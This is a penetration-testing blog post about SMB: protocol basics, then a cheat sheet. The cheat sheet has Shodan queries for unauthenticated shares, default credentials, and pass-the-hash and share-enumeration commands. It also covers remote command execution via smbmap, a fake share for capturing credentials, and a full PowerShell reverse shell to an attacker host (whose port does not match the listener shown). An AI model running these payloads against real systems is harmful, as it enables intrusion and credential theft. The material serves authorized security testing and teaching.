<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="SMB Pentesting Best Practices" /><meta property="og:locale" content="en" /><meta name="description" content="SMB" /><meta property="og:description" content="SMB" /><link rel="canonical" href="https://secybr.com/posts/smb-pentesting-best-practices/" /><meta property="og:url" content="https://secybr.com/posts/smb-pentesting-best-practices/" /><meta property="og:site_name" content="secybr penetration testing, red teaming and hack tricks." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-08T00:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SMB Pentesting Best Practices" /><meta name="twitter:site" content="@0xhav0c" /><meta name="google-site-verification" content="405asbYxUs5N1iqL1zGg56yq-OlAtdexlSaC3FC7c9s" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-11-25T12:01:00+03:00","datePublished":"2022-06-08T00:00:00+03:00","description":"SMB","headline":"SMB Pentesting Best Practices","mainEntityOfPage":{"@type":"WebPage","@id":"https://secybr.com/posts/smb-pentesting-best-practices/"},"url":"https://secybr.com/posts/smb-pentesting-best-practices/"}</script><title>SMB Pentesting Best Practices | secybr | penetration testing, red teaming and hack tricks.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="secybr | penetration testing, red teaming and hack tricks."><meta name="application-name" content="secybr | penetration testing, red teaming and hack tricks."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><meta content="secybr | penetration testing, red teaming and hack tricks." property="og:site_name"><meta content="SMB Pentesting Best Practices" property="og:title"><meta content="article" property="og:type"><meta content="penetration testing, red teaming and hack tricks." property="og:description"><meta content="https://secybr.com/posts/smb-pentesting-best-practices/" property="og:url"><meta content="2022-06-08T00:00:00+03:00" property="article:published_time"><meta content="https://secybr.com/about/" property="article:author"><meta content="https://secybr.com/assets/img/logo/logo.png" property="og:image"><meta content="pentesting protocols" property="article:section"><meta content="pentesting" property="article:tag"><meta content="smb" property="article:tag"><meta content="best practicies" property="article:tag"><meta property="og:image" content="https://secybr.com/assets/img/logo/logo.png"><meta name="twitter:site" content="secybr"><meta name="twitter:creator" content="0xhav0c"><meta name="twitter:title" content="SMB Pentesting Best Practices"><meta name="twitter:description" content="penetration testing, red teaming and hack tricks."><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://secybr.com/assets/img/logo/logo.png"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6320091248407168" crossorigin="anonymous"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/logo/logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">secybr</a></div><div class="site-subtitle">is a product of 0xhav0c</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHO AM I?</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xhav0c" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xhav0c" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xhavocc','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SMB Pentesting Best Practices</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SMB Pentesting Best Practices</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1654635600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 8, 2022 </em> </span> <span> Updated <em class="" data-ts="1669366860" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Nov 25, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/0xhav0c">0xhav0c</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3158 words"> <em>17 min</em> read</span></div></div></div><div class="post-content"><h1 id="smb">SMB</h1><blockquote class="prompt-tip"><div><p>SMB usually uses ports 445</p></div></blockquote><h1 id="what-is-smb">What is SMB?</h1><p>SMB is a network file and resource sharing protocol that uses a client-server model. SMB clients such as PCs on a network connect to SMB servers to access resources such as files and directories or perform tasks like printing over the network.</p><p>Often, the term CIFS short for Common Internet File System is used interchangeably with SMB. That is because CIFS was a popular Microsoft SMB implementation introduced with Windows 95. Since then, the informal use of CIFS to refer to SMB has remained common.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PORT     STATE SERVICE               VERSION
445/tcp  open  microsoft-ds 
</pre></table></code></div></div><h2 id="how-smb-works"><span class="mr-2">How SMB Works</span><a href="#how-smb-works" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>At a high-level, SMB communication is easy to understand. SMB clients connect to an SMB server using the SMB port to access SMB shares. Once they access the SMB shares, clients can do things such as collaborate on files without downloading them to their machines or print using a networked printer.</p><h3 id="what-is-an-smb-client"><span class="mr-2">What is an SMB client?</span><a href="#what-is-an-smb-client" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>An SMB client is the device that accesses resources on an SMB server. For example, within a corporate network, the user PCs that access a shared drive are SMB clients.</p><h3 id="what-is-an-smb-server"><span class="mr-2">What is an SMB server?</span><a href="#what-is-an-smb-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>An SMB server is the network server or cluster of servers where SMB shares are stored. The SMB server grants or denies SMB clients access to the shared resources (a.k.a. SMB shares).</p><h3 id="what-is-an-smb-share"><span class="mr-2">What is an SMB Share?</span><a href="#what-is-an-smb-share" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>An SMB share, also known as an SMB file share, is simply a shared resource on an SMB server. Often, an SMB share is a directory, but it can be any shared resource. For example, network printers are often shared using SMB.</p><h2 id="what-is-the-smb-port"><span class="mr-2">What is the SMB port?</span><a href="#what-is-the-smb-port" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>By default, modern implementations of SMB use TCP port 445 as the SMB port. Older SMB implementations (pre-Windows 2000) used SMB port 139.</p><p>Versions of SMB: Understanding SMB v1, SMB v2, and SMB v3</p><ul><li>SMB v1 (SMB1)- The original SMB version. SMB1 began in the 1980s and has gone through multiple iterations. In Windows 95, Microsoft introduced CIFS as a way to implement SMB1. In modern applications, you should NOT use SMB v1 because it is insecure (no encryption, has been exploited in attacks like WannaCry and NotPetya) and inefficient (very “chatty” on networks creating congestion and reduced performance).<li>SMB v2 (SMB2)- SMB2 was introduced with Windows Vista. This version of SMB had significant improvements in performance and simplicity when compared to SMB1. Additionally, SMBv2 offered security enhancements. For example, SMB2.0.2 introduced pre-authentication integrity and SMB2 is not vulnerable to the same WannaCry and NotPeyta exploits that make SMB1 a security risk. SMB v2.1 was introduced with Windows 7 and Server 2008 R2, further improving performance and oplocks (opportunistic locking).<li>SMB v3 (SMB3)- SMB3 which introduced end-to-end SMB encryption and later are the most advanced and secure implementations of SMB. The first release of SMB3 (a.k.a. SMB v3.0) came with Windows 8 and Server 2012. SMB v3.02 was introduced in Windows 8.1 and Server 2012 R2. SMB 3.1.1 the latest SMB protocol was introduced with Windows 10 and Server 2016.</ul><h2 id="information-about-smb-versions"><span class="mr-2">Information About SMB Versions</span><a href="#information-about-smb-versions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>SMB Versions<th>OS Build<tbody><tr><td>SMB1<td>Win2000 / XP / 2003<tr><td>SMB2.0<td>Vista / 2008<tr><td>SMB2.1<td>Win7 / 2008R2<tr><td>SMB3.0<td>Win8 / 2012<tr><td>SMB 3.02<td>Win8.1 / 2012R2</table></div><h1 id="smb-pentesting">SMB Pentesting</h1><div class="table-wrapper"><table><thead><tr><th><img data-src="https://www.shodan.io/static/img/favicon.png" alt="https://www.shodan.io/static/img/favicon.png" width="20px" data-proofer-ignore> Shodan search query :<tbody><tr><td><code class="language-plaintext highlighter-rouge">port:445</code><tr><td>#File Shares :<code class="language-plaintext highlighter-rouge">"Authentication: disabled" port:445</code><tr><td>#Specifically domain controllers: <code class="language-plaintext highlighter-rouge">"Authentication: disabled" NETLOGON SYSVOL -unix port:445</code><tr><td>#Concerning files: <code class="language-plaintext highlighter-rouge">"Authentication: disabled" "Shared this folder to access QuickBooks files OverNetwork" -unix port:445</code><tr><td>#Search SMB Authentication enabled and SMB version 1 : <code class="language-plaintext highlighter-rouge">port:445 country:CA region:NB "SMB Status Authentication: enabled SMB Version: 1"</code><tr><td>#SMB version 1: <code class="language-plaintext highlighter-rouge">SM Version 1</code></table></div><h2 id="banner-grabbing"><span class="mr-2">Banner Grabbing</span><a href="#banner-grabbing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="scan-a-network-searching-for-hosts"><span class="mr-2">Scan a network searching for hosts:</span><a href="#scan-a-network-searching-for-hosts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-r</span> 10.10.x.x/24
</pre></table></code></div></div><h3 id="smb-version-enumeration"><span class="mr-2">SMB version enumeration:</span><a href="#smb-version-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>msf <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_version
<span class="c"># Discover real samba version if hidden</span>
<span class="nb">sudo </span>ngrep <span class="nt">-i</span> <span class="nt">-d</span> tap0 ‘s.?a.?m.?b.?a.<span class="k">*</span><span class="o">[[</span>:digit:]]’ &amp; smbclient <span class="nt">-L</span> //10.10.x.x
crackmapexec smb 10.10.x.x 
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span> smb-protocols 10.10.x.x
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/pitcures/smb/smb1.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/pitcures/smb/smb2.png" alt="Untitled" data-proofer-ignore></p><h3 id="challenge-response-support-status-and-smb-signing-support-can-be-checked"><span class="mr-2">Challenge Response support status and SMB signing support can be checked:</span><a href="#challenge-response-support-status-and-smb-signing-support-can-be-checked" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-security-mode 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb2-security-mode 10.10.x.x
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb3.png" alt="Untitled" data-proofer-ignore></p><h2 id="connection-tools"><span class="mr-2">Connection Tools</span><a href="#connection-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Linux:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>smbclient
smbget
/usr/share/doc/python-impacket/examples/ python scripts
smbexec.py and psexec.py 
wmiexec.py
smb4k
</pre></table></code></div></div><p>Windows:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w">
</span></pre></table></code></div></div><h2 id="possible-credentials"><span class="mr-2">Possible Credentials</span><a href="#possible-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>Usernames<th>Common Passwords<tbody><tr><td>(blank)<td>(blank)<tr><td>guest<td>(blank)<tr><td>Administrator, admin<td>(blank), password, administrator, admin<tr><td>arcserve<td>arcserve, backup<tr><td>tivoli, tmersrvd<td>tivoli, tmersrvd, admin<tr><td>backupexec, backup<td>backupexec, backup, arcada<tr><td>test, lab, demo<td>password, test, lab, demo</table></div><h2 id="obtain-information"><span class="mr-2">Obtain Information</span><a href="#obtain-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="c">#Dump interesting information</span>
enum4linux <span class="nt">-a</span> <span class="nt">-u</span> <span class="s2">"0xhav0c"</span> <span class="nt">-p</span> <span class="s2">"Password123!"</span> 10.10.x.x
nmap <span class="nt">--script</span> <span class="s2">"safe or smb-enum-*"</span> <span class="nt">-p</span> 445 10.10.x.x

<span class="c">#Connect to the rpc</span>
rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 10.10.x.x <span class="c">#No creds</span>
rpcclient //192.168.x.x <span class="nt">-U</span> secybr.local/0xhav0c%754d87d42adabcca32bdb34a876cbffb <span class="nt">--pw-nt-hash</span>
<span class="c">#You can use querydispinfo and enumdomusers to query user information</span>

<span class="c">#Dump user information</span>
/usr/share/doc/python3-impacket/examples/samrdump.py <span class="nt">-port</span> 445 secybr.local/0xhav0c:<span class="s1">'Password123!'</span>@192.168.x.x
/usr/share/doc/python3-impacket/examples/samrdump.py <span class="nt">-port</span> 139 secybr.local/0xhav0c:<span class="s1">'Password123!'</span>@192.168.x.x

<span class="c">#Map possible RPC endpoints</span>
/usr/share/doc/python3-impacket/examples/rpcdump.py <span class="nt">-port</span> 135 secybr.local/0xhav0c:<span class="s1">'Password123!'</span>@192.168.x.x
/usr/share/doc/python3-impacket/examples/rpcdump.py <span class="nt">-port</span> 139 secybr.local/0xhav0c:<span class="s1">'Password123!'</span>@192.168.x.x
/usr/share/doc/python3-impacket/examples/rpcdump.py <span class="nt">-port</span> 445 secybr.local/0xhav0c:<span class="s1">'Password123!'</span>@192.168.x.x

nmblookup <span class="nt">-A</span> 10.10.x.x <span class="c"># Get NetBIOS from IP</span>
enum4linux <span class="nt">-a</span> <span class="nt">-R</span> 500-600,950-1150 10.10.x.x <span class="c"># Enumeration using enum4linux  (identifier le nom/domaine + users + shares) </span>

<span class="c">####################</span>
List shares
<span class="c">####################</span>
smbclient <span class="nt">-L</span> //10.10.x.x
smbclient <span class="nt">-L</span> 10.10.x.x

<span class="c">####################</span>
Connect
<span class="c">####################</span>
smbclient <span class="se">\\\\</span>192.168.x.x<span class="se">\\</span>share 
smbclient <span class="nt">-U</span> <span class="s2">"secybr.local</span><span class="se">\0</span><span class="s2">xhav0c"</span> <span class="se">\\\\</span>10.10.x.x<span class="se">\\</span>IPC<span class="nv">$ </span>password <span class="c"># Connect</span>
smbclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> <span class="se">\\\\</span>10.10.x.x<span class="se">\\</span>IPC<span class="nv">$ </span><span class="c"># Specify username and no pass</span>

<span class="c">####################</span>
Nullinux <span class="k">for </span><span class="nb">users </span>and shares
<span class="c">####################</span>
<span class="c">#Installation</span>
git clone https://github.com/m8r0wn/nullinux
<span class="nb">cd </span>nullinux
<span class="nb">sudo </span>bash setup.sh
<span class="c"># Usage</span>
python3 nullinux.py <span class="nt">-users</span> <span class="nt">-quick</span> secybr.local
python3 nullinux.py 192.168.x.x/24
python3 nullinux.py <span class="nt">-u</span> <span class="s1">'secybr.local\0xhav0c'</span> <span class="nt">-p</span> <span class="s1">'Password123!'</span> 10.10.x.x

<span class="c"># Other Enumeration Commands</span>
smbmap <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> Password123! <span class="nt">-d</span> secybr.local <span class="nt">-H</span> 192.168.x.x <span class="c"># Smbmap for domains (List share drives, drive permissions, share contents, upload/download functionality..) | Basic enumeration (password or NTLM hash)</span>
smbmap <span class="nt">-u</span> <span class="s1">'0xhav0c'</span> <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-d</span> secybr.com <span class="nt">-H</span> 10.10.x.x <span class="nt">-x</span> <span class="s1">'net group "Domain Admins" /domain'</span> <span class="c"># Remote command execution</span>
smbmap <span class="nt">-H</span> 10.10.x.x <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-r</span> <span class="s1">'C$\Users'</span> <span class="c"># Non-recursive path listing</span>
smbmap <span class="nt">--host-file</span> AD-HOSTS.txt <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-d</span> secybr.com <span class="nt">-F</span> <span class="s1">'password'</span><span class="c"># File content searching !!! It's not working stabil. </span>
smbmap <span class="nt">-H</span> 192.168.x.x <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-d</span> secybr.com <span class="nt">-L</span> <span class="c"># Drive listing</span>

<span class="c">####################</span>
<span class="c"># Nifty Shell</span>
<span class="c">####################</span>
python smbmap.py <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-d</span> secybr.local <span class="nt">-H</span> 192.168.x.x <span class="nt">-x</span> <span class="s1">'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.y.y""""; $port=""""1337"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'</span> 

nc <span class="nt">-l</span> 4445 <span class="c"># Listener for atacker Machine</span>
</pre></table></code></div></div><h3 id="enumerating-lsarpc-and-samr-with-rpcclient"><span class="mr-2">Enumerating LSARPC and SAMR with rpcclient</span><a href="#enumerating-lsarpc-and-samr-with-rpcclient" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>You can use the Samba <code class="language-plaintext highlighter-rouge">rpcclient</code> utility to interact with RPC endpoints via named pipes. The following lists commands that you can issue to SAMR, LSARPC, and LSARPC-DS interfaces upon establishing a SMB session (often requiring credentials).</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c">#Users enumeration</span>
List <span class="nb">users</span>: querydispinfo and enumdomusers
Get user details: queryuser &lt;0xrid&gt;
Get user <span class="nb">groups</span>: queryusergroups &lt;0xrid&gt;
GET SID of a user: lookupnames &lt;username&gt;
Get <span class="nb">users </span>aliases: queryuseraliases <span class="o">[</span><span class="nb">builtin</span>|domain] &lt;sid&gt;
<span class="c">#Groups enumeration</span>
List <span class="nb">groups</span>: enumdomgroups
Get group details: querygroup &lt;0xrid&gt;
Get group members: querygroupmem &lt;0xrid&gt;
<span class="c">#Aliasgroups enumeration</span>
List <span class="nb">alias</span>: enumalsgroups &lt;<span class="nb">builtin</span>|domain&gt;
Get members: queryaliasmem <span class="nb">builtin</span>|domain &lt;0xrid&gt;
<span class="c">#Domains enumeration</span>
List domains: enumdomains
Get SID: lsaquery
Domain info: querydominfo
<span class="c">#More SIDs</span>
Find SIDs by name: lookupnames &lt;username&gt;
Find more SIDs: lsaenumsid
RID cycling <span class="o">(</span>check more SIDs<span class="o">)</span>: lookupsids &lt;sid&gt;
</pre></table></code></div></div><h3 id="create-fake-smb-shares-for-capture-the-credentials"><span class="mr-2">Create Fake SMB Shares for Capture the Credentials</span><a href="#create-fake-smb-shares-for-capture-the-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 smbserver.py 0xhav0c /File/path/to/share/folder <span class="c"># 0xhav0c == Share Name </span>
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb7.png" alt="fake smb server for the capture credentials" data-proofer-ignore> <em>fake smb server for the capture credentials</em></p><h3 id="smb-enumeration-scripts-with-nmap"><span class="mr-2">SMB Enumeration Scripts with Nmap</span><a href="#smb-enumeration-scripts-with-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-mbenum 10.10.x.x <span class="c"># Master Browser information can be listed.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-os-discovery 10.10.x.x <span class="c"># Operating system version information can be obtained.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-protocols 10.10.x.x <span class="c"># According to the answers to the sent queries, the protocols of the SMB version can be detected.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb2-capabilities 10.10.x.x <span class="c"># According to the answers to the sent queries, the protocols of the SMB version can be detected.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-domains 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-groups 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-processes 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-sessions 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-server-stats 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-system-info 10.10.x.x
